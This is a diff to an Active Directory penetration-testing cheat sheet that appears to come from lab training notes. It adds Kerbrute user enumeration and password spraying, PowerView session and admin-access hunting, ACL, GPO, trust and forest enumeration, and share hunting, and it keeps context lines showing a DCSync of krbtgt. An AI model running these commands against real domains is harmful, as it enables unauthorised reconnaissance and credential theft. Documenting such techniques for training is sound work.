@@ -230,6 +230,40 @@ nmap -p445 --script=smb-vuln-* <TARGET_IP>
 <pre class="language-bash"><code class="lang-bash"><strong>nmblookup -A &#x3C;TARGET_IP>
 </strong></code></pre>
 
+### **User Enumeration**
+
+#### **Kerbrute**
+
+```bash
+kerbrute userenum -d DC.LOCAL --dc 192.168.1.1 usernames.txt -o valid_ad_users.txt
+#Extract valid usernames from results:
+cat valid_ad_users.txt | awk -F "VALID USERNAME:\t" '{print $2}' | tr -d ' ' | sed '/^$/d' | awk -F '@' '{print $1}' | tee users.txt
+#Checking for Passwords Matching Usernames Some users may have their username as their password:
+kerbrute bruteuser -d DC.LOCAL -dc 192.168.1.1 usernames.txt passwords.txt
+```
+
+#### PowerView
+
+*   Find all machines on the current domain where the current user has local admin access
+
+    ```powershell
+    Find-LocalAdminAccess -Verbose
+    ```
+*   Find computers where a domain admin (or specified user/group) has sessions:
+
+    ```powershell
+    Find-DomainUserLocation -Verbose
+    Find-DomainUserLocation -UserGroupIdentity "RDPUsers"
+    ```
+
+#### [Invoke Session Hunter](https://github.com/Leo4j/InvokeSessionHunter)
+
+*   List sessions on remote machines Users
+
+    ```powershell
+    Invoke-SessionHunter -FailSafe
+    ```
+
 ### **Domain Enumeration**
 
 **PowerView**
@@ -289,6 +323,9 @@ Get-ObjectAcl -SamAccountName "Administrator" -ResolveGUIDs
 #Search for interesting ACEs
 Find-InterestingDomainAcl -ResolveGUIDs
 
+#Get ACLs where studentx has interesting permissions
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student867"}
+
 #Get the ACLs associated with the specified path
 Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
 
@@ -312,8 +349,53 @@ Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
 Get-DomainOU
 Get-ADOrganizationalUnit -Filter * -Properties *
 
+#List all the computers in the DevOps OU
+(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
+
 #Get GPO applied on an OU, read GPOname from gplink attribute from Get-NetOU
 Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE...........}"
+<strong>#Enumerate GPO applied on the DevOps OU
+</strong>#To enumerate GPO applied on the DevOps OU, we need the name of the policy from the gplink attribute from the OU:
+(Get-DomainOU -Identity DevOps).gplink
+[LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
+#Copy the value between {} including the brackets as well:  {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
+#Or Enumerate GPO for DevOps OU in a unique command
+Get-DomainGPO -Identity (Get-DomainOU -Identity DevOps).gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)
+
+###Domain Trust Enumeration
+##To enumerate domain trusts:
+#List all domain trusts for the current domain
+Get-DomainTrust
+#List trusts for a specific domain
+Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
+#Using Active Directory module
+Get-ADTrust
+Get-ADTrust -Identity us.dollarcorp.moneycorp.local
+#List external trusts in the current forest
+Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+
+##Forest Enumeration
+#To map information about the forest:
+#Get details about the current forest
+Get-Forest
+Get-Forest -Forest eurocorp.local
+#Using Active Directory module
+Get-ADForest
+Get-ADForest -Identity eurocorp.local
+#Retrieve all domains in the current forest:
+Get-ForestDomain
+Get-ForestDomain -Forest eurocorp.local
+(Get-ADForest).Domains
+#Retrieve all global catalogs for the forest:
+Get-ForestGlobalCatalog
+Get-ForestGlobalCatalog -Forest eurocorp.local
+Get-ADForest | Select-Object -ExpandProperty GlobalCatalogs
+#Map forest trust relationships (if any exist):
+Get-ForestTrust
+Get-ForestTrust -Forest eurocorp.local
+#Alternative using Active Directory module
+Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
 </code></pre>
 
 #### BloodHound  <a href="#bloodhound-installation" id="bloodhound-installation"></a>
@@ -427,7 +509,8 @@ smbclient //corp-dc/SharedFiles -U "dev-angelist.lab/devan%P@ssword123!" #we can
 
 #### PowerHuntShares
 
-```bash
+```powershell
+Import-Module C:\AD\Tools\PowerHuntShares.psm1
 Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
 ```
 
@@ -1379,10 +1462,6 @@ SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt"
 #By default, Domain Admin privileges are required to execute this attack.
 </code></pre>
 
-
-
-
-
 #### **Start Session**
 
 ```powershell
@@ -1618,23 +1697,15 @@ hashdump
 
 #### Relaying
 
-<pre class="language-powershell"><code class="lang-powershell">##PowerShell
+```powershell
+##PowerShell
 #Get services with unquoted paths and a space in their name
 Get-WmiObject -Class win32_service | select pathname
 
 #Check permissions info regarding a service
-sc.exe sdshow &#x3C;service_name>
+sc.exe sdshow <service_name>
 
 ##PowerUp
-<strong>#Get services with unquoted paths and a space in their name
-</strong>Get-ServiceUnquoted -Verbose
-
-#Get services where the current user can write to its binary path or change arguments to the binary
-Get-ModifiableServiceFile -Verbose
-
-#Get services where the user's current configuration can be modified
-Get-ModifiableService -Verbose
-
 #Run all PrivEsc checks
 Invoke-AllChecks
 
@@ -1645,6 +1716,19 @@ Invoke-PrivEscCheck
 ##WinPeas
 #Run all PrivEsc checks
 winPEASx64.exe
+```
+
+### Unquoted Service Path
+
+<pre class="language-powershell"><code class="lang-powershell"><strong>##PowerUp
+</strong>#List path for windows services:
+Get-WmiObject -Class win32_service | select pathname
+#Get services with unquoted paths and a space in their name:
+Get-ServiceUnquoted -Verbose
+#Get services where the current user can write to its binary path and change arguments to the binary:
+Get-ModifiableServiceFile -Verbose
+#Get the services whose configuration current user can be modified:
+Get-ModifiableServiceFile -Verbose
 </code></pre>
 
 #### [**Feature Abuse**](readme/network-security-3/network-security/2.1.md)
